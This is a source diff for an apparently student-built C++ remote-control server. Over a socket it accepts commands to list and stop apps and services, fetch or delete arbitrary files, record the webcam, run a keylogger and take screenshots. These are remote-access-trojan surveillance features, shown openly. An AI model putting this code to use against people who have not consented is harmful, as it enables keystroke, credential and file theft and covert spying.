@@ -22,23 +22,8 @@
 using namespace std;
 using namespace Gdiplus;
 
-void serverCallback(char buffer[1024], int clientSocket)
-{
-    cout << "Client: " << buffer << endl; 
-    string msg(buffer);
-    // "COMMAND$PAYLOAD"  
-    //shutdown$ 
-    //keylogging$a
-    // vector<string> msgArr = splitStr(msg,"$");
-    // string command = msgArr[0];
-    // string payload = msgArr[1]; 
 
-
-
-    // match commands 
-    
-    send(clientSocket, "ok", strlen("ok"), 0);
-}
+bool sendDataToClient(SOCKET s, const string &filePath) ;
 
 void shutDownComputer(){
     cout << "Computer will shut down in 30 second!";
@@ -50,17 +35,52 @@ void restartComputer(){
     system("C:\\windows\\system32\\shutdown /r /t 30\n\n");
 }
 
+
+
+string base64_decode(const string& input) {
+    static const int decoding_table[256] = {
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 0-15
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 16-31
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63, // 32-47
+    52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1, // 48-63
+    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14, // 64-79
+    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1, // 80-95
+    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40, // 96-111
+    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1, // 112-127
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 128-143
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 144-159
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 160-175
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 176-191
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 192-207
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1, // 208-223
+    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1  // 224-239
+    };
+    string decoded;
+    int val = 0, valb = -8;
+
+    for (unsigned char c : input) {
+        if (decoding_table[c] == -1) break; 
+        val = (val << 6) + decoding_table[c];
+        valb += 6;
+        if (valb >= 0) {
+            decoded.push_back(char((val >> valb) & 0xFF));
+            valb -= 8;
+        }
+    }
+    return decoded;
+}
+
 bool sendDataToClient(SOCKET s, const string &filePath) 
 {
     char buffer[BUFFER_SIZE];
 
-    int f = filePath.find('.');
-    string fileType = filePath.substr(f);
-    int typeLength = fileType.length();
-    if (send(s, (char*)&typeLength, sizeof(typeLength), 0) == SOCKET_ERROR) 
-        cout << "Cannot send type length.\n";
-    if (send(s, fileType.c_str(), typeLength, 0) == SOCKET_ERROR)
-        cout << "Cannot send file type.\n";
+    // int f = filePath.find('.');
+    // string fileType = filePath.substr(f);
+    // int typeLength = fileType.length();
+    // if (send(s, (char*)&typeLength, sizeof(typeLength), 0) == SOCKET_ERROR) 
+        // cout << "Cannot send type length.\n";
+    // if (send(s, fileType.c_str(), typeLength, 0) == SOCKET_ERROR)
+        // cout << "Cannot send file type.\n";
     ifstream file(filePath, ios::binary);
     if (!file.is_open()) 
     {
@@ -70,25 +90,50 @@ bool sendDataToClient(SOCKET s, const string &filePath)
 
     cout << "Sending file: " << filePath << " to client." << endl;
 
+    string total;
+    int maxSize = 1024 * 8; 
     while (file.read(buffer, BUFFER_SIZE) || file.gcount() > 0) 
     {
-        int bytesToSend = static_cast<int>(file.gcount());
-        if (send(s, buffer, bytesToSend, 0) == SOCKET_ERROR) 
-        {
-            cerr << "Failed to send data to client." << endl;
-            file.close();
-            return false;
-        }
+        total.append(buffer, file.gcount());
+        if(total.size() >= maxSize)
+            break;
+    } 
+    total.append(buffer, file.gcount());
+    
+    cout << "Total " << total << endl;
+
+    if (send(s, total.c_str(), total.size(), 0) == SOCKET_ERROR) 
+    {
+        cerr << "Failed to send data to client." << endl;
+        file.close();
+
+        // log error 
+            int errCode = WSAGetLastError(); // Retrieve the error code
+
+    // Output the error code
+    std::cerr << "Socket error code: " << errCode << std::endl;
+
+    // Convert the error code to a human-readable message
+    char* errorMessage = nullptr;
+    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                   nullptr, errCode, 0, (LPSTR)&errorMessage, 0, nullptr);
+
+    if (errorMessage) {
+        std::cerr << "Error message: " << errorMessage << std::endl;
+        LocalFree(errorMessage); // Free the buffer
+    }
+        return false;
     }
     file.close();
     cout << "File sent successfully." << endl;
+    shutdown(s, SD_SEND);
     return true;
  
 }
 
 void sendListApps(SOCKET s) {
     system("wmic product get name,version > listApps.txt");
-    Sleep(20000);
+    // Sleep(10000);
     sendDataToClient(s, "listApps.txt");
 } 
 
@@ -104,8 +149,7 @@ void stopApp(const string &appName) {
 
 void sendListServices(SOCKET s) {
     system("wmic service get name, displayname, state > listServices.txt");
-    Sleep(20000);
-    sendDataToClient(s, "listApps.txt");
+    sendDataToClient(s, "listServices.txt");
 }
 
 void startService(const string &serviceName) {
@@ -230,7 +274,7 @@ void recordVideo(const std::string& outputFileName, int frameWidth, int frameHei
         cv::imshow("Recording", frame);
 
         // Break the loop if the user presses the 'q' key
-        if (isOff()) {
+         if (cv::waitKey(1) == 'q') {
             break;
         }
     }
@@ -258,6 +302,7 @@ void saveRecording(){
 
     // Call the recordVideo function
     recordVideo("output.avi", frameWidth, frameHeight,isWebCamOff);
+    
 
 }
 
@@ -310,6 +355,100 @@ void logKeyStroke(){
     UnhookWindowsHookEx(keyboardHook);
 }
 
+// for string delimiter 
+// source: https://stackoverflow.com/questions/14265581/parse-split-a-string-in-c-using-string-delimiter-standard-c
+ vector<string> splitSML(string s, string delimiter) {
+    size_t pos_start = 0, pos_end, delim_len = delimiter.length();
+    string token;
+    vector<string> res;
+
+    while ((pos_end = s.find(delimiter, pos_start)) != string::npos) {
+        token = s.substr (pos_start, pos_end - pos_start);
+        pos_start = pos_end + delim_len;
+        res.push_back(token);
+    }
+
+    res.push_back(s.substr(pos_start));
+    return res;
+}
+void serverCallback(char buffer[1024], int clientSocket)
+{
+    // cout << "Client: " << buffer << endl; 
+    string msg(buffer);
+    vector<string> msgArr = splitSML(msg," ");
+    cout << "Full msg: " << msg << endl; 
+
+    string command = msgArr[0];
+    string payload ="";
+    if(msgArr.size() >= 2)
+    {
+        cout << "Payload: " << msgArr[1] << endl; 
+        payload = msgArr[1];      
+    }
+
+    cout << "Processing command: " << command << endl;
+    cout << "Processing payload: " << payload << endl;
+
+    if(command == "listapp"){ 
+       sendListApps(clientSocket);
+    } else if(command == "startapp"){ 
+        startApp(payload);
+    } else if(command == "stopapp"){ 
+        stopApp(payload);
+    } else if(command == "listservice"){
+        sendListServices(clientSocket); 
+    } else if(command == "startservice"){
+        startService(payload); 
+    } else if(command == "stopservice"){
+        stopService(payload); 
+    } else if(command == "getfile"){
+        sendDataToClient(clientSocket, payload); 
+    } else if(command == "deletefile"){
+        deleteFile(payload); 
+    } else if(command == "recordwebcam"){
+        saveRecording(); 
+        sendDataToClient(clientSocket, "output.avi");
+    } else if(command == "keylogger"){ 
+        logKeyStroke();
+        sendDataToClient(clientSocket, "keylog.txt");
+    }else if(command =="screenshot"){ 
+    captureScreen("screenshot.png"); 
+    sendDataToClient(clientSocket,"screenshot.png");
+    }
+
+
+    
+    // TEsTING EFATURES 
+    // shut down/reset 
+    // shutdown() 
+    // restartComputer();
+
+
+
+
+   
+
+    
+
+
+    // get file 
+    // sendDataToClient() 
+
+    //delete file 
+    // deleteFile("listApps.txt");
+
+    // screen shot 
+    // captureScreen("D:\\Development\\ktlt-rcpc-master\\ktlt-rcpc\\screenshot.png");  
+ 
+   
+    // keylogger  
+    // logKeyStroke();
+
+
+
+
+}
+
 int main() {
 #ifdef _WIN32
     WSADATA wsa;
@@ -322,57 +461,11 @@ int main() {
         return 1;
     }
 #endif
-    // Socket socket;
-    // socket.hostServer();
-    // socket.listenForConnection(&serverCallback);
-    
-    // captureScreen("E:\\ProjectMMT\\ktlt-rcpc\\screenshot.png"); 
-
+    Socket socket;
+    socket.hostServer();
+    socket.listenForConnection(&serverCallback);
 
     
-    // TEsTING EFATURES 
-    // loi dll ko chay dc 
-    // shut down/reset 
-    // shutdown() 
-    // restartComputer();
-
-
-    // list app 
-    // system("wmic product get name,version > listApps.txt"); 
-
-    // start/stop app
-    // startApp("msedge"); 
-    // stopApp("msedge"); 
-
-    // list services 
-    // system("wmic service get name, displayname, state > listServices.txt");
-
-    // start/stop services
-
-    startService("CloudflareWARP");
-    int x;
-    cin >> x;
-    stopService("CloudflareWARP");
-
-
-
-    // get file 
-    // sendDataToClient() 
-
-    //delete file 
-    // deleteFile("listApps.txt");
-
-    // screen shot 
-    // captureScreen("D:\\Development\\ktlt-rcpc-master\\ktlt-rcpc\\screenshot.png");  
- 
-    // int a; 
-    // cin >> a; 
-    // record webcam   
-     saveRecording();
-
-    // keylogger  
-    logKeyStroke();
-
 
     return 0;
 }
